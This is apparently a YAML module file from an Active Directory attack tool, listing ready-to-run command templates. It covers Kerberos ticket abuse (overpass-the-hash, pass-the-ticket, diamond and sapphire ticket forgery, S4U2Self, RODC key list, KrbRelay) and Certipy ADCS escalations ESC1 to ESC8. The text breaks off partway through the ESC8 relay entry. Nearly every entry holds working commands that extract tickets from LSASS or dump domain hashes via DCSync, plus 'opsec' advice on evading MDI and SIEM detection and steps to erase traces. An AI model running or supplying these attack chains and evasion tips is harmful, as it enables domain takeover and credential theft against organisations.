  - id: kerb_overpass_hash
    name: Overpass-the-Hash — Convert NTLM to Full Kerberos TGT
    tab: Lateral Movement
    requires: [DC_IP, DOMAIN, USERNAME, NTLM_HASH]
    tags: [kerberos, overpass-the-hash, tgt, ntlm, pth, lateral]
    description: >
      Convert an NTLM hash into a full Kerberos TGT — avoids NTLM auth which
      is more heavily monitored and blocked by some defenses. The resulting TGT
      can be used for pass-the-ticket attacks across Kerberized services.
      Stealthier than PTH in environments with NTLM monitoring.
    commands:
      - label: "Get TGT from NTLM hash"
        cmd: "impacket-getTGT '{DOMAIN}/{USERNAME}' -hashes :{NTLM_HASH} -dc-ip {DC_IP}"
      - label: "Get TGT from AES256 key"
        cmd: "impacket-getTGT '{DOMAIN}/{USERNAME}' -aesKey {AES256_KEY} -dc-ip {DC_IP}"
      - label: "Set TGT for use"
        cmd: "export KRB5CCNAME=./{USERNAME}.ccache"
      - label: "Use TGT for Kerberos auth"
        cmd: "impacket-wmiexec -k -no-pass '{DOMAIN}/{USERNAME}'@{TARGET}"
      - label: "Use TGT with nxc"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -d {DOMAIN} --use-kcache -k"
      - label: "Request TGT via Rubeus (on-target)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Rubeus.exe asktgt /user:{USERNAME} /rc4:{NTLM_HASH} /ptt'"
    opsec: >
      TGT request generates 4768 on DC — same as normal Kerberos auth.
      RC4 (NTLM hash) TGTs can be detected by MDI as encryption downgrade
      if AES is expected. Use AES keys when possible for stealth.
    cleanup:
      - label: "Remove ccache file"
        cmd: "rm -f ./{USERNAME}.ccache && unset KRB5CCNAME"

  - id: kerb_pass_ticket
    name: Pass-the-Ticket — Import and Use Existing Kerberos Tickets
    tab: Lateral Movement
    requires: [DC_IP, DOMAIN, USERNAME]
    tags: [kerberos, pass-the-ticket, ptt, ccache, tgt, lateral]
    description: >
      Import and use existing Kerberos tickets without knowing the account
      password or hash. Extract tickets from memory on compromised hosts then
      use them on your attacker machine. Ideal when you dump a DA's active TGT
      from a host they're logged into.
    commands:
      - label: "Extract all Kerberos tickets from memory (Mimikatz)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Invoke-Mimikatz -Command \"sekurlsa::tickets /export\"'"
      - label: "List available tickets on target"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'klist'"
      - label: "Convert kirbi to ccache (for Linux use)"
        cmd: "impacket-ticketConverter ticket.kirbi ticket.ccache"
      - label: "Convert ccache to kirbi (for Windows use)"
        cmd: "impacket-ticketConverter ticket.ccache ticket.kirbi"
      - label: "Set and use ticket"
        cmd: "export KRB5CCNAME=./ticket.ccache && impacket-secretsdump -k -no-pass '{DOMAIN}/{USERNAME}'@{DC_IP}"
      - label: "Use ticket with nxc"
        cmd: "nxc smb {DC_IP} -u '{USERNAME}' -d {DOMAIN} -k --use-kcache"
      - label: "Inject ticket into current session (Rubeus)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Rubeus.exe ptt /ticket:<base64_ticket>'"
    opsec: >
      Ticket use generates service ticket requests (4769) — blends with normal
      Kerberos traffic. No password or hash involved — stealthy. TGT export
      from memory triggers Sysmon Event 10 (LSASS access).
    cleanup:
      - label: "Remove ticket files"
        cmd: "rm -f *.ccache *.kirbi && unset KRB5CCNAME"

  - id: kerb_diamond_ticket
    name: Diamond Ticket — Patched Legitimate TGT (Stealthy Golden Ticket)
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, KRBTGT_HASH, DOMAIN_SID]
    requires_priv: da
    tags: [kerberos, diamond-ticket, tgt, persistence, stealthy, krbtgt]
    description: >
      Diamond tickets request a legitimate TGT from the KDC then patch the PAC
      to add extra group memberships. Unlike golden tickets, the TGT is KDC-issued
      so it passes validation checks that catch golden tickets. Much harder to
      detect than golden tickets — the ticket is cryptographically valid.
    commands:
      - label: "Get KRBTGT AES256 key (needed for diamond ticket)"
        cmd: "impacket-secretsdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} -just-dc-user krbtgt -outputfile /tmp/krbtgt"
      - label: "Create diamond ticket (ticketer with --request flag)"
        cmd: "impacket-ticketer -request -user '{USERNAME}' -password '{PASSWORD}' -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -groups 512,518,519,520 {USERNAME}"
      - label: "Use diamond ticket"
        cmd: "export KRB5CCNAME=./{USERNAME}.ccache && impacket-secretsdump -k -no-pass '{DOMAIN}/{USERNAME}'@{DC_IP}"
      - label: "Rubeus diamond ticket (on-target)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Rubeus.exe diamond /tgtdeleg /ticketuser:{USERNAME} /ticketuserrid:500 /groups:512 /krbkey:{KRBTGT_AES256} /nowrap'"
    opsec: >
      Diamond ticket requests a real TGT from KDC (generates 4768) then modifies
      the PAC locally. The TGT validation succeeds where golden tickets fail.
      MDI has limited detection for diamond tickets compared to golden tickets.
    cleanup:
      - label: "Remove ticket files"
        cmd: "rm -f ./{USERNAME}.ccache && unset KRB5CCNAME"

  - id: kerb_sapphire_ticket
    name: Sapphire Ticket — Copied Real PAC (Near-Undetectable)
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, KRBTGT_HASH, DOMAIN_SID, TARGET_USER]
    requires_priv: da
    tags: [kerberos, sapphire-ticket, pac, persistence, stealthy, undetectable]
    description: >
      Sapphire tickets use S4U2Self + U2U to obtain a real service ticket for
      a privileged user containing their legitimate PAC, then that PAC is embedded
      into a forged TGT. The PAC is completely genuine — copied from a real ticket.
      The most stealthy form of Kerberos ticket forgery — nearly undetectable.
    commands:
      - label: "Create sapphire ticket via impacket"
        cmd: "impacket-ticketer -request -user '{USERNAME}' -password '{PASSWORD}' -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -impersonate {TARGET_USER} {TARGET_USER}"
      - label: "Use sapphire ticket"
        cmd: "export KRB5CCNAME=./{TARGET_USER}.ccache && impacket-secretsdump -k -no-pass '{DOMAIN}/{TARGET_USER}'@{DC_IP}"
      - label: "Rubeus sapphire ticket (on-target)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'Rubeus.exe sapphire /target:{DC_FQDN} /user:{TARGET_USER} /rc4:{KRBTGT_HASH} /domain:{DOMAIN} /nowrap'"
      - label: "Verify ticket gives DA access"
        cmd: "nxc smb {DC_IP} -u '{TARGET_USER}' -d {DOMAIN} -k --use-kcache"
    opsec: >
      Sapphire tickets contain a genuine PAC from a real user — PAC validation
      passes completely. Only anomaly is a non-standard S4U2Self flow. Extremely
      difficult to detect. Prefer over golden/diamond tickets when stealth matters.
    cleanup:
      - label: "Remove ticket files"
        cmd: "rm -f ./{TARGET_USER}.ccache && unset KRB5CCNAME"

  - id: kerb_s4u2self_local
    name: S4U2Self — Local Privilege Escalation via Kerberos
    tab: Privilege Escalation
    requires: [DC_IP, DOMAIN, TARGET_COMPUTER]
    tags: [kerberos, s4u2self, local-privesc, service-ticket, machine-account]
    description: >
      S4U2Self allows a service account to obtain a service ticket to itself on
      behalf of any user — including local admin impersonation. When combined with
      a machine account hash, allows impersonating any user (including DA) for
      local services on that computer. Used in NoPac chain.
    commands:
      - label: "Get service ticket for any user on target (after getting machine hash)"
        cmd: "impacket-getST -self -impersonate administrator -altservice 'cifs/{TARGET_COMPUTER}.{DOMAIN}' '{DOMAIN}/{TARGET_COMPUTER}$' -hashes :{MACHINE_HASH} -dc-ip {DC_IP}"
      - label: "Use ticket to access target as administrator"
        cmd: "export KRB5CCNAME=./administrator@cifs_{TARGET_COMPUTER}.{DOMAIN}.ccache && impacket-smbexec -k -no-pass '{DOMAIN}/administrator'@{TARGET_COMPUTER}.{DOMAIN}"
      - label: "Dump secrets with S4U2Self ticket"
        cmd: "export KRB5CCNAME=./administrator@cifs_{TARGET_COMPUTER}.{DOMAIN}.ccache && impacket-secretsdump -k -no-pass '{DOMAIN}/administrator'@{TARGET_COMPUTER}.{DOMAIN}"
    opsec: >
      S4U2Self generates 4769 service ticket events. Impersonation of administrator
      for self-service is anomalous — detectable by MDI/advanced Kerberos monitoring.
    cleanup:
      - label: "Remove ticket files"
        cmd: "rm -f ./administrator*.ccache && unset KRB5CCNAME"

  - id: kerb_rodc_key_list
    name: RODC Key List Attack — Extract Secrets from Read-Only DC
    tab: Credential Attacks
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [kerberos, rodc, key-list, credential-dump, read-only-dc]
    description: >
      RODCs (Read-Only Domain Controllers) cache credentials for accounts in
      their Allowed Password Replication Policy. The RODC machine account can
      request a list of cached credentials from the primary DC. If you compromise
      an RODC machine account, you can decrypt the cached secrets for all
      accounts whose credentials are cached on that RODC.
    commands:
      - label: "Find RODCs in environment"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(primaryGroupID=521)' 'sAMAccountName dNSHostName'"
      - label: "Check accounts cached on RODC (Allowed Password Replication Policy)"
        cmd: "nxc ldap {DC_IP} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} --query '(objectClass=msDS-RevealedUsers)' 'sAMAccountName'"
      - label: "Key list attack — dump cached secrets via RODC machine account"
        cmd: "impacket-secretsdump -rodcNo {RODC_KRBTGT_ID} -rodcKey {RODC_KRBTGT_KEY} '{DOMAIN}/{RODC_MACHINE_ACCOUNT}$:{MACHINE_PASSWORD}'@{DC_IP} -just-dc-ntlm"
      - label: "Get RODC KRBTGT key number and key"
        cmd: "impacket-secretsdump '{DOMAIN}/{USERNAME}:{PASSWORD}'@{RODC_IP} -just-dc -outputfile /tmp/rodc_secrets"
    opsec: >
      Key list attack replicates from the primary DC — generates 4662 events.
      Less common attack path — may not be monitored. RODC compromise is a
      good pivot to get some domain credentials without touching the main DC.
    cleanup: []

  - id: kerb_kerberos_relay
    name: KrbRelay — Kerberos Relay via COM (Local Privilege Escalation)
    tab: Privilege Escalation
    requires: [TARGET, USERNAME, PASSWORD, DOMAIN]
    tags: [kerberos, kerberolay, relay, com, local-privesc, ldap]
    description: >
      Relay Kerberos authentication from a high-privilege COM server to LDAP
      for local privilege escalation — no network position needed. Abuses
      COM object instantiation to capture and relay Kerberos auth from SYSTEM
      to local LDAP, enabling RBCD setup or shadow credentials for local privesc.
    commands:
      - label: "Find COM objects for relay (list SPNs on local machine)"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X '[System.DirectoryServices.DirectoryEntry]::new().distinguishedName'"
      - label: "KrbRelayUp — automated local privesc chain"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'KrbRelayUp.exe relay -d {DOMAIN} -dc {DC_IP} -ShadowCredentialsOutfile C:\\Windows\\Temp\\shadow.pfx'"
      - label: "Manual KrbRelay — set up RBCD and get SYSTEM"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -X 'KrbRelay.exe -spn ldap/{DC_FQDN} -clsid {COM_CLSID} -rbcd {ATTACKER_MACHINE}'"
      - label: "Authenticate with shadow credential obtained"
        cmd: "certipy auth -pfx 'C:\\Windows\\Temp\\shadow.pfx' -dc-ip {DC_IP}"
    opsec: >
      COM instantiation events visible in Windows Application logs. LDAP
      modifications via relay logged on DC. Local attack — no network traffic
      to attacker machine. Stealthy from network perspective.
    cleanup:
      - label: "Remove shadow credential"
        cmd: "certipy shadow remove -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -account '{TARGET_COMPUTER}$' -dc-ip {DC_IP}"
      - label: "Remove files"
        cmd: "nxc smb {TARGET} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -x 'del /f C:\\Windows\\Temp\\shadow.pfx'"

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║        AD▸PWN — Certipy ADCS Attack Paths (certipy_attacks.yaml)           ║
# ║        ESC1 through ESC16 — based on Certipy wiki by Oliver Lyak            ║
# ╚══════════════════════════════════════════════════════════════════════════════╝



  # ══════════════════════════════════════════════════════════════════════════════
  # ADCS ENUMERATION — Always run first
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_find
    name: Certipy — Full ADCS Enumeration (All ESC)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: null
    tags:
      - adcs
      - certipy
      - enum
      - esc
      - templates
    description: >
      Full ADCS enumeration — finds all ESC1–ESC16 misconfigurations, vulnerable
      templates, CA settings, OID links, and web enrollment status. Always run
      this first before attempting any ESC exploitation.
    commands:
      - label: "Get admin SID (needed for most ESC attacks)"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user administrator read"
      - label: "Full find — vulnerable templates + stdout"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout"
      - label: "Full find — save to files for review"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -output /tmp/certipy_{DOMAIN}"
      - label: "Find with OID enumeration (needed for ESC13)"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout -oids"
      - label: "NetExec ADCS module"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M adcs"
    next:
      - Check for ESC1 — Enrollee supplies subject + client auth EKU
      - Check for ESC6 — User Specified SAN enabled on CA
      - Check for ESC8 — Web enrollment over HTTP or HTTPS without EPA
      - Check for ESC13 — Issuance policy linked to privileged group
    opsec: >
      LDAP queries are logged. Certipy find is relatively quiet — single LDAP
      session. Low detection risk compared to other attacks.
    cleanup: []

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC1 — Enrollee-Supplied Subject
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc1
    name: ESC1 — Enrollee-Supplied Subject (SAN Abuse)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc1
      - certipy
      - san
      - impersonation
      - critical
    description: >
      ESC1: Template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + client auth EKU +
      no manager approval. Any domain user with enroll rights can request a cert
      for any user including DA by specifying their UPN in the SAN. Direct DA
      compromise from any domain user.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Confirm template is vulnerable"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout | grep -A 15 '{TEMPLATE}'"
      - label: "Step 2 — Request cert as target user (with SID)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE'"
      - label: "Step 2 (no SID — older envs)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}'"
      - label: "Step 3 — Authenticate with cert → get hash + TGT"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with recovered hash"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Use recovered DA hash for DCSync
      - Create golden ticket with KRBTGT hash
      - Remove cert files after use
    opsec: >
      Certificate enrollment generates CA event 4886. Single request blends
      into normal traffic. Auth generates 4768/4769.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx {TARGET_USER}.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC2 — Any Purpose EKU
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc2
    name: ESC2 — Any Purpose EKU (Enrollment Agent Abuse)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc2
      - certipy
      - any-purpose
      - enrollment-agent
    description: >
      ESC2: Template has "Any Purpose" EKU (OID 2.5.29.37.0) or no EKU —
      implicitly grants Certificate Request Agent capability. Get an Any Purpose
      cert then use it to enroll on behalf of a DA. Effectively ESC3 via Any Purpose.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Request Any Purpose cert for yourself"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'"
      - label: "Step 2 — Use Any Purpose cert as agent to get DA cert"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template 'User' -pfx '{USERNAME}.pfx' -on-behalf-of '{DOMAIN}\\{TARGET_USER}'"
      - label: "Step 3 — Authenticate with DA cert"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with recovered hash"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Use recovered DA hash for DCSync
      - Clean up cert files immediately
    opsec: >
      Two-step cert enrollment — both generate CA event 4886. The on-behalf-of
      request may alert if CA auditing is enabled.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f {USERNAME}.pfx {TARGET_USER}.pfx *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC3 — Enrollment Agent
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc3
    name: ESC3 — Certificate Request Agent (Enrollment Agent)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc3
      - certipy
      - enrollment-agent
      - on-behalf-of
    description: >
      ESC3: A template with Certificate Request Agent EKU is enrollable by low-priv
      users. Use that cert as an enrollment agent to request a cert on behalf of
      any user (including DA) from a second template. Schema V1 templates (User,
      Machine) are common targets as they don't restrict agent enrollment.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Get enrollment agent cert"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'"
      - label: "Step 2 — Use agent cert to enroll on behalf of DA"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template 'User' -pfx '{USERNAME}.pfx' -on-behalf-of '{DOMAIN}\\{TARGET_USER}'"
      - label: "Step 3 — Authenticate with obtained cert"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with recovered hash"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Use recovered DA hash for DCSync
      - Remove cert files after use
    opsec: >
      Certificate requests logged (4886). The on-behalf-of request is unusual
      and may trigger SIEM alerts if CA certificate auditing is enabled.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f {USERNAME}.pfx {TARGET_USER}.pfx *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC4 — Template Hijacking (Write on Template Object)
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc4
    name: ESC4 — Template Hijacking (Write ACL on Template)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc4
      - certipy
      - template-hijack
      - acl-abuse
    description: >
      ESC4: Attacker has WriteDACL/WriteOwner/FullControl over a certificate
      template AD object. Modify the template to become ESC1-vulnerable, request
      a DA cert, then restore the template. BloodHound will show write ACL paths
      to template objects.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Modify template to ESC1-vulnerable state (auto-saves backup)"
        cmd: "certipy template -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -template '{TEMPLATE}' -write-default-configuration"
      - label: "Step 2 — Request cert as DA from hijacked template"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE'"
      - label: "Step 3 — Authenticate with cert"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — IMMEDIATELY restore original template"
        cmd: "certipy template -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -template '{TEMPLATE}' -write-configuration '{TEMPLATE}.json' -no-save"
      - label: "Step 5 — DCSync with recovered hash"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Restore template immediately after cert is obtained
      - DCSync with recovered hash
    opsec: >
      Template modification logged (AD event 5136). Restore immediately.
      CA may take minutes to pick up template changes — wait before requesting.
    cleanup:
      - label: "Restore template from backup JSON"
        cmd: "certipy template -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -template '{TEMPLATE}' -write-configuration '{TEMPLATE}.json' -no-save"
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx {TEMPLATE}.json *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC6 — CA Allows SAN via Request Attributes
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc6
    name: ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2 (SAN Override)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc6
      - certipy
      - san
      - ca-flag
    description: >
      ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows any requester to
      specify arbitrary SANs via request attributes on ANY template. Combined with
      ESC9 or ESC16 (no SID extension), works even on fully patched DCs. Standalone
      ESC6 is blocked by SID extension on patched environments.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Check CA for ESC6 flag"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A5 'User Specified SAN'"
      - label: "Step 1 — Request cert with injected SAN (ESC6 + ESC9/ESC16 env)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE'"
      - label: "Step 2 — Authenticate with cert"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
      - label: "Step 3 — DCSync"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Check if ESC9 or ESC16 also present for full enforcement bypass
      - Combine with ESC9 template or ESC16 CA config
    opsec: >
      Cert request logged (4886). Single targeted request — low noise.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC7 — Manage CA Rights
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc7
    name: ESC7 — Dangerous Permissions on CA (ManageCA)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc7
      - certipy
      - manage-ca
      - subca
    description: >
      ESC7: Attacker has ManageCA permission on the CA. Use it to add yourself as
      Certificate Officer, enable SubCA template, submit a request (will fail but
      saves private key), approve it yourself, retrieve cert. Full domain compromise
      from ManageCA permission.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Add self as Certificate Officer"
        cmd: "certipy ca -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -ns {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -add-officer '{USERNAME}'"
      - label: "Step 2 — Enable SubCA template"
        cmd: "certipy ca -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -ns {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -enable-template 'SubCA'"
      - label: "Step 3 — Submit request (will fail — save private key)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template 'SubCA' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE'"
      - label: "Step 4 — Approve the request (use request ID from step 3)"
        cmd: "certipy ca -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -ns {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -issue-request 1"
      - label: "Step 5 — Retrieve the approved cert"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -retrieve 1"
      - label: "Step 6 — Authenticate with cert"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
      - label: "Step 7 — DCSync"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Approve pending requests quickly — they show in CA event log
      - DCSync with recovered hash
    opsec: >
      CA officer assignment and template enabling are logged. Pending request
      approval logged. Entire chain is visible in CA event log.
    cleanup:
      - label: "Remove officer role"
        cmd: "certipy ca -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -ns {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -remove-officer '{USERNAME}'"
      - label: "Disable SubCA template"
        cmd: "certipy ca -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -ns {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -disable-template 'SubCA'"
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx *.key *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC8 — HTTP Relay to Web Enrollment
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc8
    name: ESC8 — NTLM Relay to ADCS Web Enrollment (HTTP/no-EPA)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_IP
      - ATTACKER_IP
    requires_priv: null
    tags:
      - adcs
      - esc8
      - certipy
      - relay
      - coerce
      - web-enrollment
    description: >
      ESC8: ADCS Web Enrollment accessible over HTTP or HTTPS without EPA
      (Extended Protection for Authentication). Coerce DC auth via PetitPotam
      or PrinterBug, relay to /certsrv/certfnsh.asp to get a DC certificate,
      then authenticate as DC and DCSync.
    commands:
      - label: "Step 0 — Check CA for ESC8"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A10 'Web Enrollment'"
      - label: "Step 1 — Start Certipy relay (terminal 1)"
        cmd: "certipy relay -target 'https://{CA_IP}' -template 'DomainController'"
      - label: "Step 1b — If HTTP (not HTTPS)"
        cmd: "certipy relay -target 'http://{CA_IP}' -template 'DomainController'"
      - label: "Step 2 — Coerce DC via PetitPotam (terminal 2)"
        cmd: "python3 PetitPotam.py -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}"
      - label: "Step 2b — Coerce via PrinterBug"
        cmd: "python3 printerbug.py '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} {ATTACKER_IP}"
